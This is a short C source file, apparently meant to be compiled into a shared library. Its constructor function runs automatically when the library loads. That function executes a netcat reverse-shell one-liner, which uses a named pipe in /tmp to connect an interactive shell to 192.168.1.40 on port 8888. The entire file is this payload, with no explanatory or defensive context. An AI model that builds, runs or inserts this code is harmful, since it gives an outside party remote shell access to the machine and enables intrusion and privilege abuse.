#include <stdio.h>
__attribute__((constructor))
void init()
{
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.1.40 8888 >/tmp/f");
}